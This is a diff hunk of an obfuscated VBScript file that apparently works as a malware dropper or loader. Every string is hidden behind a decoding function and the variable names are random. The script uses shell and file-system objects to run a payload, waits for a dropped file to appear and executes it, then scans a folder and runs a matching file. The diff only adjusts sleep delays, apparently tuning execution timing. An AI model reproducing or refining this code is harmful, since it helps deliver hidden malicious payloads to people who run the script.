@@ -100,20 +100,20 @@ dhf0VGA74.Close
 Set ogqpfsoIY = CreateObject(x0ZaS6D0("XHuMLI}Y:hV_*fCjM$)I?^Z[9bHbVJ"))
 ogqpfsoIY.CurrentDirectory = x0ZaS6D0("/d~9K0\R3K(in[shUiyRey") + oxSeFdTron + x0ZaS6D0("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
 ogqpfsoIY.Run vIBN4g0g
-wscript.sleep 1000
 retk56kw534w34 = true
 do While (retk56kw534w34 = true)
 If lRiDgJJ.FileExists(x0ZaS6D0("/d~9K0\R3K(in[shUiyRey") + oxSeFdTron + x0ZaS6D0("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + kZgPyx) Then
+    wscript.sleep 2000
     ogqpfsoIY.Run kZgPyx
     retk56kw534w34 = false
 end if
-wscript.sleep 1000
 Loop
 sXs1eM1FHX = true
 Set z1l5NWZp = CreateObject(x0ZaS6D0("|29I?Y|hL_qfVjG_rdd]{$M<1_[b%[-IeoViWj][+cvEAX5`![]Y0j|B"))
 do While (sXs1eM1FHX = true)
     For Each bWi1ZsU7 in z1l5NWZp.GetFolder(x0ZaS6D0("/d~9K0\R3K(in[shUiyRey") + oxSeFdTron + x0ZaS6D0("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")).Files
         if InStr(bWi1ZsU7,x0ZaS6D0("8_y9{e#cBf#hNeGl`#uZ")) > 0 then
+            wscript.sleep 1500
             ogqpfsoIY.Run bWi1ZsU7.name
             sXs1eM1FHX = false
             Exit For
